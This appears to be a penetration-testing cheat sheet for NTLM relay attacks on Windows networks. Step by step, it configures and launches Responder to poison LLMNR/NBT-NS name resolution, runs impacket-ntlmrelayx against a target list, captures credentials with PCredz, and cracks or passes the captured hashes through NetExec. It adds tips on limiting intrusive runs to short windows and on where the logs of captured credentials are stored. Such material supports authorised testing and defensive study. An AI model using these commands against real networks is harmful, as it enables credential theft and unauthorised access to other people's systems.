# NTLM Relaying Tactics - Responder, NTLMRelayx, and Pcredz:
By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.

 ### 1. Turn off SMB Server in Responder.conf. We will be utilizing the SMB Server in impacket-ntlmrelayx.

    $ sudo nano /usr/share/responder/Responder.conf

![Screenshot 2024-10-18 143302](https://github.com/user-attachments/assets/5930d61a-4072-473d-b4f9-9fda7720cf64)

 ### 2. Initiate Responder
    
    $ sudo responder -I eth0 -v

 ### 3. Initiate ntlmrelayx in a separate terminal:

    $ sudo impacket-ntlmrelayx -tf /Desktop/targets -smb2support -r -d -w
   (will provide more victims, but is more intrusive so run in short periods of time, 30 minutes max)

 ### 4. Initiate PCredz in a separate terminal:

    $ cd /opt/tools/PCredz
    $ sudo pipenv run python Pcredz -i eth0

### 5. Once a hash is captured attempt to crack.

### 6. Attempt Pass-the-Hash through NetExec.
    Only NTLM hashes can be utilized for PtH attacks. This excludes NetNTLMv1 and NetNTLMv2.
   
### 7. If hash is cracked use password in NetExec.

**Log Locations of tools used:**

    - /usr/share/responder/logs
    - /opt/tools/PCredz/logs/
    - impacket-ntlmrelayx does not automatically save logs, add '-lf' command and output file location.
   
**Additional References:**

   - https://github.com/lgandx/Responder
   - https://github.com/fortra/impacket
   - https://github.com/lgandx/PCredz
   - https://attack.mitre.org/techniques/T1557/001/
   - https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
   - https://www.giac.org/paper/gcih/34273/pass-the-hash-windows-10/174913#:~:text=The%20NTLMv2%20authentication%20process%20applies,knowledge%20of%20the%20corresponding%20password.

**Additional Tool:**
    python MultiRelay.py -t <Target_Scope> -u ALL
